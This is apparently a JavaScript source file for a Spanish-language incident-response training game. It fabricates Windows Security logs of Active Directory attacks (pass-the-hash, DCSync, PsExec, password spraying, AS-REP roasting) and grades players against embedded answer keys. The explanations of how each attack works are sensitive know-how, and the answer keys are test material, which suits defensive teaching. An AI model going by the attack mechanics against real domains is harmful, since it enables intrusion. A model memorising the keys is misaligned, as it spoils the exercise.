      pista: "Filtra id=4768 y busca PreAuthType distinto de 2.",
      checks: [["Activar la preautenticación de Kerberos en esa cuenta", 1], ["Cambiar su contraseña por una larga", 1], ["Buscar otras cuentas con DONT_REQ_PREAUTH (Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true})", 1],
        ["Desactivar la auditoría de Kerberos", 0], ["Agregar la cuenta a Domain Admins para vigilarla", 0], ["Reiniciar el equipo del usuario", 0]],
      explica: "Si una cuenta tiene 'no requiere preautenticación', cualquiera puede pedir su AS-REP y crackearlo fuera de línea sin conocer nada. PreAuthType 0 en el 4768 es la huella. El 4624 posterior indica que lo crackeó. Se apaga quitando esa opción (o con Set-ADAccountControl … -DoesNotRequirePreAuth $false)." };
  }),
  spray: () => casoAd((E, dom, dc) => {
    const ip = iIpInt(), cae = iA(["lruiz", "dhernandez", "cmartinez"]);
    const us = iMezcla(["jlopez", "mgarcia", "aperez", "srodriguez", "cmartinez", "dhernandez", "lruiz", "fsanchez", "pdiaz", "rtorres", "agomez", "mreyes", "jcastro", "lmorales", "evargas", "ojimenez"]).filter((x) => x !== cae).slice(0, iN(10, 14));
    ruidoAd(E, 9, dom, dc);
    for (const u of us) E({ id: 4771, equipo: dc, usuario: u, ip, detalle: "Kerberos pre-auth falló · FailureCode: 0x18" }, 0, 2);
    E({ id: 4624, equipo: dc, usuario: `${dom}\\${cae}`, ip, detalle: "LogonType 3 · Kerberos" }, 0, 2);
    ruidoAd(E, 7, dom, dc);
    return { cuenta: cae, titulo: "Un intento fallido por cuenta… en muchas cuentas", alerta: "Fallos de autenticación en más de 10 usuarios distintos en un minuto, todos desde el mismo equipo interno; ninguna cuenta se bloqueó.",
      preguntas: [{ q: "¿Desde qué IP vienen los intentos?", r: ip }, { q: "¿Qué cuenta cayó (inició sesión con éxito)?", r: cae }, { q: "¿Qué FailureCode de Kerberos significa contraseña incorrecta? (hex)", r: "0x18" }],
      tecnica: "Password spraying (T1110.003)",
      pista: "Filtra id=4771 y fíjate que cada usuario aparece una sola vez. Después busca un 4624 de la misma IP.",
      checks: [["Cambiar la contraseña de la cuenta comprometida y revisar qué hizo", 1], ["Aislar el equipo de origen de los intentos", 1], ["Prohibir contraseñas comunes (Temporada+Año) con una lista de bloqueo", 1],
        ["Subir el umbral de bloqueo a 1000 intentos", 0], ["Desactivar el evento 4771", 0], ["Reiniciar todos los equipos", 0]],
      explica: "En vez de muchas contraseñas contra una cuenta (fuerza bruta, que bloquea), prueba UNA contraseña común contra muchas cuentas: no dispara el bloqueo. Señal: un 4771/4625 por usuario, muchos usuarios, mismo origen y luego un éxito." };
  }),
  pth: () => casoAd((E, dom, dc) => {
    const adm = iA(["adm_jperez", "adm_mlopez", "it_admin"]), ws = `WS-${iA(["FIN", "RH", "VENTAS"])}-${iN(10, 40)}`, ip = iIpInt();
    ruidoAd(E, 10, dom, dc);
    for (const srv of iMezcla(["SRV-FILE01", "SRV-APP02", "SRV-SQL01", "SRV-BK01"]).slice(0, 3)) {
      E({ id: 4624, equipo: srv, usuario: `${dom}\\${adm}`, ip, detalle: `LogonType 3 · AuthenticationPackage: NTLM · LogonProcess: NtLmSsp · KeyLength: 0 · desde ${ws}` }, 5, 15);
      E({ id: 4672, equipo: srv, usuario: `${dom}\\${adm}`, ip: "-", detalle: "Privilegios especiales asignados (SeDebugPrivilege, SeBackupPrivilege…)" }, 0, 1);
    }
    ruidoAd(E, 6, dom, dc);
    return { cuenta: adm, titulo: `Inicios de sesión NTLM de ${adm} a varios servidores`, alerta: `${adm} normalmente usa Kerberos desde la estación del equipo de TI; ahora aparece entrando por NTLM a varios servidores en pocos minutos desde otra máquina.`,
      preguntas: [{ q: "¿Desde qué equipo se movió?", r: ws }, { q: "¿Qué cuenta usó? (sin dominio)", r: adm }, { q: "¿Qué paquete de autenticación usó? (Kerberos o NTLM)", r: "NTLM" }],
      tecnica: "Pass-the-Hash (T1550.002)",
      pista: "Filtra id=4624 y AuthenticationPackage: NTLM. En un dominio sano casi todo es Kerberos.",
      checks: [[`Aislar ${ws} de la red`, 1], [`Rotar la contraseña de ${adm} (y las de admin local con LAPS)`, 1], ["Restringir NTLM y meter a los admins en el grupo Protected Users", 1],
        ["Desactivar Windows Defender en los servidores para investigar", 0], ["Borrar el log Security", 0], ["Solo reiniciar los servidores", 0]],
      explica: "Con el hash NTLM de una cuenta (robado de la memoria de un equipo) el atacante se autentica sin conocer la contraseña. Señales: 4624 tipo 3 con NTLM y KeyLength 0, la misma cuenta privilegiada en varios equipos en minutos, desde una estación que no es la suya." };
  }),
  dcsync: () => casoAd((E, dom, dc) => {
    const u = iA(["svc_sync", "helpdesk02", "aperez"]), ip = iIpInt();
    ruidoAd(E, 8, dom, dc);
    E({ id: 4662, equipo: dc, usuario: `${dom}\\DC02$`, ip: "10.10.0.11", detalle: "Operación en objeto DS · Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (replicación normal entre DCs)" }, 3, 9);
    ruidoAd(E, 5, dom, dc);
    E({ id: 4662, equipo: dc, usuario: `${dom}\\${u}`, ip, detalle: "Operación en objeto DS · Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}" }, 3, 9);
    E({ id: 4662, equipo: dc, usuario: `${dom}\\${u}`, ip, detalle: "Operación en objeto DS · Properties: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}" }, 0, 1);
    ruidoAd(E, 6, dom, dc);
    return { cuenta: u, titulo: "Replicación del directorio pedida por una cuenta que no es DC", alerta: `El DC registró una solicitud de replicación de contraseñas (DRSUAPI) hecha desde ${ip}, que no es un controlador de dominio.`,
      preguntas: [{ q: "¿Qué cuenta pidió la replicación sin ser un DC? (sin dominio)", r: u }, { q: "¿Desde qué IP?", r: ip },
        { q: "¿Con qué 8 caracteres empieza el GUID de 'Replicating Directory Changes All'?", r: "1131f6ad" }],
      tecnica: "DCSync (T1003.006)",
      pista: "Filtra id=4662 y descarta las cuentas que terminan en $ (equipos/DCs).",
      checks: [[`Quitar a ${u} los permisos de replicación del dominio`, 1], ["Resetear DOS veces la contraseña de krbtgt", 1], ["Tratarlo como compromiso total del dominio: rotar todas las cuentas privilegiadas", 1],
        [`Solo cambiar la contraseña de ${u} y cerrar el ticket`, 0], ["Apagar DC02", 0], ["Desactivar para siempre la replicación entre DCs", 0]],
      explica: "DCSync se hace pasar por un DC y pide la replicación de los hashes de TODAS las cuentas (incluida krbtgt). Los GUID 1131f6aa (Get-Changes) y 1131f6ad (Get-Changes-All) solo deberían verse con cuentas de DC (terminan en $). Con el hash de krbtgt se fabrican Golden Tickets: por eso se resetea dos veces." };
  }),
  psexec: () => casoAd((E, dom, dc) => {
    const u = iA(["adm_jperez", "it_soporte", "adm_mlopez"]), ws = `WS-${iA(["FIN", "RH", "VENTAS"])}-${iN(10, 40)}`, srv = iA(["SRV-APP02", "SRV-SQL01", "SRV-FILE01"]), ip = iIpInt();
    ruidoAd(E, 10, dom, dc);
    E({ id: 4624, equipo: srv, usuario: `${dom}\\${u}`, ip, detalle: `LogonType 3 · desde ${ws}` });
    E({ id: 5145, equipo: srv, usuario: `${dom}\\${u}`, ip, detalle: "Recurso compartido: \\\\*\\ADMIN$ · Archivo: PSEXESVC.exe · WriteData" }, 0, 2);
    E({ id: 7045, equipo: srv, usuario: "SYSTEM", ip: "-", detalle: "Servicio instalado: PSEXESVC · ImagePath: %SystemRoot%\\PSEXESVC.exe · StartType: demand" }, 0, 2);
    E({ id: 4688, equipo: srv, usuario: "SYSTEM", ip: "-", detalle: "Proceso: C:\\Windows\\System32\\cmd.exe · Padre: C:\\Windows\\PSEXESVC.exe" }, 0, 3);
    ruidoAd(E, 7, dom, dc);
    return { cuenta: u, titulo: `Servicio nuevo instalado en ${srv}`, alerta: `${srv} registró la instalación de un servicio que nadie del equipo de TI programó, justo después de un inicio de sesión remoto.`,
      preguntas: [{ q: "¿A qué servidor llegó el atacante?", r: srv }, { q: "¿Qué servicio se instaló?", r: "PSEXESVC", alt: ["psexesvc.exe"] },
        { q: "¿Qué Event ID registra la instalación de un servicio?", r: "7045" }],
      tecnica: "Movimiento lateral con PsExec (T1021.002 / T1569.002)",
      pista: "Busca id=7045 y luego mira qué pasó justo antes (5145, 4624) y después (4688).",
      checks: [[`Aislar ${ws} y ${srv}`, 1], [`Revisar qué ejecutó cmd.exe en ${srv}`, 1], ["Bloquear SMB (445) entre estaciones y servidores que no lo necesitan", 1],
        ["Desinstalar Office del servidor", 0], ["Borrar el evento 7045", 0], ["Apagar el firewall para que no estorbe", 0]],
      explica: "PsExec copia PSEXESVC.exe por SMB al recurso ADMIN$ (5145), lo instala como servicio (7045) y lanza procesos como SYSTEM (4688 con padre PSEXESVC). Es una herramienta legítima de TI que los atacantes usan para moverse entre equipos." };
  }),
  nuevo_admin: () => casoAd((E, dom, dc) => {
    const quien = iA(["helpdesk02", "svc_sync", "aperez"]), nuevo = iA(["svc_backup2", "adm1n", "sql_svc01", "soporte.ti"]);
    ruidoAd(E, 9, dom, dc);
    E({ id: 4720, equipo: dc, usuario: `${dom}\\${quien}`, ip: iIpInt(), detalle: `Cuenta creada: ${nuevo}` }, 5, 20);
    E({ id: 4738, equipo: dc, usuario: `${dom}\\${quien}`, ip: "-", detalle: `Cuenta modificada: ${nuevo} · PasswordNeverExpires` }, 0, 3);
    E({ id: 4728, equipo: dc, usuario: `${dom}\\${quien}`, ip: "-", detalle: `${nuevo} agregado al grupo global de seguridad: Domain Admins` }, 0, 3);
    ruidoAd(E, 7, dom, dc);
    return { cuenta: nuevo, cuentaTxt: "nueva del atacante", titulo: "Cambio en un grupo privilegiado del dominio", alerta: "Alerta de alta prioridad: un miembro nuevo en un grupo con control total del dominio, fuera de horario y sin ticket de cambio.",
      cmdExtra: [new RegExp(`Remove-ADUser\\s+(-Identity\\s+)?["']?${nuevo}`, "i"), new RegExp(`Remove-ADGroupMember\\s+[^\\n]*Domain Admins[^\\n]*${nuevo}`, "i"),
        new RegExp(`net\\s+user\\s+${nuevo}\\s+\\/del(ete)?`, "i")],
      preguntas: [{ q: "¿Qué cuenta se creó?", r: nuevo }, { q: "¿A qué grupo la agregaron?", r: "Domain Admins", alt: ["domain admins", "admins. del dominio"] },
        { q: "¿Qué cuenta la creó? (sin dominio)", r: quien }],
      tecnica: "Persistencia: cuenta nueva con privilegios (T1136.002 / T1098)",
      pista: "Event IDs de cuentas y grupos: 4720 crear, 4738 modificar, 4728/4732/4756 agregar a un grupo.",
      checks: [["Sacar la cuenta de Domain Admins y deshabilitarla", 1], [`Investigar ${quien}: también está comprometida`, 1], ["Alertar siempre los cambios en grupos privilegiados (4728/4732/4756)", 1],
        ["Renombrar la cuenta a algo menos sospechoso", 0], ["Agregarla también a Enterprise Admins para auditarla", 0], ["Reiniciar el DC", 0]],
      explica: "Crear una cuenta propia y meterla a Domain Admins le da al atacante una puerta trasera aunque le cambies la contraseña a la cuenta que robó. 4720 + 4728 seguidos, fuera de horario y con PasswordNeverExpires, es una alerta crítica." };
  }),
};
const TECNICAS_INV = {
  web: ["Inyección SQL (SQLi)", "Cross-Site Scripting (XSS)", "Path traversal / Inclusión de archivos locales (LFI)",
    "Fuerza bruta al login web", "Enumeración de directorios (fuzzing de contenido)", "Inyección de comandos del sistema operativo", "Subida de archivos maliciosos (webshell)",
    "Server-Side Request Forgery (SSRF)", "Referencia directa insegura a objetos (IDOR / BOLA)", "XML External Entity (XXE)", "Denegación de servicio (DoS)"],
  ad: ["Kerberoasting (T1558.003)", "AS-REP Roasting (T1558.004)", "Password spraying (T1110.003)", "Pass-the-Hash (T1550.002)", "DCSync (T1003.006)",
    "Movimiento lateral con PsExec (T1021.002 / T1569.002)", "Persistencia: cuenta nueva con privilegios (T1136.002 / T1098)", "Golden Ticket (T1558.001)", "Fuerza bruta a una sola cuenta (T1110.001)"],
};

// ====================================================================== partida
function empezarInvRvb(modo) {
  INV.modo = modo; INV.gen = modo === "web" ? ESC_WEB : ESC_AD;
  const claves = Object.keys(INV.gen);
  Object.assign(RB, { activo: true, hp: 100, puntos: 0, hist: [], oleada: 0, restantes: [...claves], total: Math.min(OLEADAS_INV[RB.dif], claves.length), seg: DUR_INV[RB.dif] });
  siguienteOleadaInv();
}
const empezarWebRvb = () => empezarInvRvb("web");
const empezarAdRvb = () => empezarInvRvb("ad");

async function siguienteOleadaInv() {
  if (!RB.activo) return;
  if (RB.oleada >= RB.total || !RB.restantes.length) return finInvRvb(true);
  RB.oleada++;
  const tit = INV.modo === "web" ? `🕸️ Red vs Blue · Web · Oleada ${RB.oleada}/${RB.total}` : `🏢 Red vs Blue · Windows / AD · Oleada ${RB.oleada}/${RB.total}`;
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(tit)}<div class="trabajo"><div class="girar"></div><div>El atacante está eligiendo su jugada…</div></div></div>`;
  actualizarHud();
  const j = await jugadaIA(RB.restantes);
  if (!RB.activo) return;
  const accion = RB.restantes.includes(j.accion) ? j.accion : RB.restantes[0];
  RB.restantes = RB.restantes.filter((x) => x !== accion);
  const c = INV.gen[accion]();
  RB.actual = { accion, c, inicio: Date.now(), pista: false };
  const checks = iMezcla(c.checks.map(([t, ok], k) => ({ t, ok, k })));
  RB.actual.checks = checks;
  const tecnicas = iMezcla(TECNICAS_INV[INV.modo]);
  const conPista = RB.dif === "facil" || RB.dif === "normal";
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(tit)}
    <div class="rvb-alerta"><div class="sub"><span>🚨 ALERTA</span> · <span>${INV.modo === "web" ? "access.log del servidor web" : "Windows Security (controlador de dominio y servidores)"}</span></div><b>${esc(c.titulo)}</b><p>${esc(c.alerta)}</p></div>
    <div class="fila-filtro"><input class="mono" id="invQ" placeholder="${esc(c.filtroAyuda)}"><button class="chico" id="invLimpiar">Limpiar</button></div>
    <div class="sub" id="invN"></div>
    <div class="soc-tabla"><table class="tabla"><thead><tr>${c.columnas.map(([, n]) => `<th>${esc(n)}</th>`).join("")}</tr></thead><tbody id="invFilas"></tbody></table></div>
    <h3>1 · Evidencia</h3>
    ${c.preguntas.map((p, i) => `<div class="pregunta"><div><b>${esc(p.q)}</b></div><input class="mono" data-inv-r="${i}" autocomplete="off" spellcheck="false"><div class="expl"></div></div>`).join("")}
    <h3>2 · ¿Qué técnica es?</h3>
    <select id="invTec"><option value="">— elige —</option>${tecnicas.map((t) => `<option value="${esc(t)}">${esc(t)}</option>`).join("")}</select>
    <h3>3 · Contención</h3>
    <label>${esc(c.cmd.texto)}<input class="mono" id="invCmd" autocomplete="off" spellcheck="false" placeholder="${INV.modo === "web" ? "sudo ufw deny from …" : "Disable-ADAccount -Identity …"}"></label>
    <p class="sub">Marca TODAS las acciones correctas (y ninguna de las malas):</p>
    <div class="inv-checks">${checks.map((x, i) => `<label class="check"><input type="checkbox" data-inv-c="${i}"> ${esc(x.t)}</label>`).join("")}</div>
    <div class="acciones"><button class="primario" id="invRevisar">🛡️ Cerrar el incidente</button>${conPista ? `<button id="invPista">💡 Pista (−15 pts)</button>` : ""}<button id="invRendir">🏳️ Me rindo</button></div>
    <div id="rbFb"></div></div>`;
  mensajeAtacante(j.mensaje);
  actualizarHud();
  const filtra = () => {
    const terms = $("#invQ").value.trim().toLowerCase().split(/\s+/).filter(Boolean);
    const ok = c.filas.filter((e) => terms.every((t) => {
      const m = t.match(/^(\w+)=(.*)$/);
      if (m && m[1] in e) return String(e[m[1]]).toLowerCase().includes(m[2]);
      return Object.values(e).join(" ").toLowerCase().includes(t);
    }));
    $("#invN").textContent = `${ok.length} de ${c.filas.length} eventos`;
    $("#invFilas").innerHTML = ok.map((e) => `<tr>${c.columnas.map(([k]) => `<td${["ruta", "detalle", "ua"].includes(k) ? ' class="mono" data-no-tr' : ""}>${esc(e[k])}</td>`).join("")}</tr>`).join("");
  };
  $("#invQ").addEventListener("input", filtra);
  $("#invLimpiar").addEventListener("click", () => { $("#invQ").value = ""; filtra(); });
  filtra();
  $("#invRevisar").addEventListener("click", () => revisarInv(false));
  $("#invRendir").addEventListener("click", () => revisarInv(true));
  $("#invPista")?.addEventListener("click", () => {
    if (RB.actual.pista) return;
    RB.actual.pista = true; RB.puntos -= 15; actualizarHud();
    $("#rbFb").insertAdjacentHTML("beforeend", `<p class="lx-pista">💡 ${esc(c.pista)}</p>`);
    $("#invPista").disabled = true;
  });
  clearInterval(RB.reloj);
  RB.reloj = setInterval(() => {
    const resta = RB.seg - (Date.now() - RB.actual.inicio) / 1000;
    if ($("#rbReloj")) $("#rbReloj").textContent = `⏱ ${fmtT(resta)}`;
    if (resta <= 0) revisarInv(true);
  }, 250);
}

const normInv = (v) => String(v ?? "").trim().toLowerCase().replace(/^["'`]|["'`]$/g, "").replace(/\s+/g, " ");
function revisarInv(final) {
  if (!RB.activo || RB.actual.cerrada) return;
  const c = RB.actual.c;
  const resp = c.preguntas.map((p, i) => {
    const v = normInv($(`[data-inv-r="${i}"]`).value);
    return [p.r, ...(p.alt || [])].some((x) => normInv(x) === v);
  });
  const okEv = resp.every(Boolean), okTec = $("#invTec").value === c.tecnica;
  const marcadas = RB.actual.checks.map((x, i) => $(`[data-inv-c="${i}"]`).checked);
  const okChecks = RB.actual.checks.every((x, i) => !!x.ok === marcadas[i]);
  const okCmd = c.cmd.valida($("#invCmd").value);
  const okCont = okChecks && okCmd;
  const buenas = [okEv, okTec, okCont].filter(Boolean).length;
  if (!final && buenas < 3) {  // como en CCNA: puedes corregir antes de rendirte (cuesta puntos)
    RB.puntos -= 10; actualizarHud();
    $("#rbFb").innerHTML = `<div class="rvb-mal"><span>✗ Todavía no queda contenido (−10 pts).</span> <span>${okEv ? "✓ Evidencia" : "✗ Evidencia"}</span> · <span>${okTec ? "✓ Técnica" : "✗ Técnica"}</span> · <span>${okCont ? "✓ Contención" : "✗ Contención"}</span>${okCont || okCmd ? "" : " <span>(el comando)</span>"}${okCont || okChecks ? "" : " <span>(las acciones)</span>"}</div>`;
    resp.forEach((ok, i) => { $(`[data-inv-r="${i}"]`).classList.toggle("mal", !ok); });
    return;
  }
  RB.actual.cerrada = true; clearInterval(RB.reloj);
  const seg = (Date.now() - RB.actual.inicio) / 1000;
  const danio = Math.round(DIF_RB[RB.dif].danio * (3 - buenas) / 3);
  const pts = buenas * 40 + (buenas === 3 ? 60 + Math.round(80 * Math.max(0, 1 - seg / RB.seg)) : 0);
  RB.hp -= danio; RB.puntos += pts;
  RB.hist.push({ accion: RB.actual.accion, resultado: buenas === 3 ? "bloqueado" : "exito", aciertos: buenas, segundos: Math.round(seg) });
  if (!okTec || !okCont) agregarRepaso("SOC", "flash", { enunciado: `¿Qué técnica es y cómo se contiene? ${c.alerta}`,
    respuestas: [c.tecnica, ...c.checks.filter(([, ok]) => ok).map(([t]) => t)], explicacion: c.explica, origen: "Red vs Blue" }, `rvb:${INV.modo}:${RB.actual.accion}`);
  c.preguntas.forEach((p, i) => {
    $(`[data-inv-r="${i}"]`).nextElementSibling.innerHTML = `<span class="${resp[i] ? "ok-txt" : "error"}">${resp[i] ? "✓" : `✗ Era: ${esc(p.r)}`}</span>`;
  });
  RB.actual.checks.forEach((x, i) => { const l = $(`[data-inv-c="${i}"]`).parentElement; l.classList.add(x.ok ? "ok-txt" : "error"); });
  $$("[data-inv-c], [data-inv-r], #invTec, #invCmd, #invRevisar, #invRendir, #invPista").forEach((x) => { x.disabled = true; });
  $("#rbFb").innerHTML = `<div class="${buenas === 3 ? "rvb-ok" : "rvb-mal"}"><b>${buenas === 3 ? "🛡️ ¡Incidente contenido!" : "💥 El ataque siguió su curso."}</b> <span data-no-tr>${buenas}/3</span> · <span>+${pts} pts</span>${danio ? ` · <span>−${danio}% integridad</span>` : ""}</div>
    <ul class="rvb-crono"><li class="${okEv ? "ok-txt" : "error"}"><span>${okEv ? "Evidencia completa" : "Evidencia incompleta"}</span></li>
      <li class="${okTec ? "ok-txt" : "error"}"><span>${esc(c.tecnica)}</span></li>
      <li class="${okCont ? "ok-txt" : "error"}"><span>Contención, por ejemplo:</span> <code data-no-tr>${esc(c.cmd.ejemplo)}</code> <span>+ las acciones en verde</span></li></ul>
    <p class="sub">${esc(c.explica)}</p>
    <div class="acciones"><button class="primario" id="rbSig">${RB.hp > 0 ? "Siguiente oleada →" : "Ver resultado"}</button></div>`;
  actualizarHud();
  $("#rbSig").addEventListener("click", () => RB.hp > 0 ? siguienteOleadaInv() : finInvRvb(false));
}

function finInvRvb(gano) {
  finRvb(gano && RB.hp > 0, `<ul class="rvb-crono">${RB.hist.map((h) => `<li class="${h.resultado === "bloqueado" ? "ok-txt" : "error"}">${h.resultado === "bloqueado" ? "🛡️" : "💥"} ${esc(h.accion.replace(/_/g, " "))} · ${h.aciertos}/3 · ${h.segundos} s</li>`).join("")}</ul>`);
}
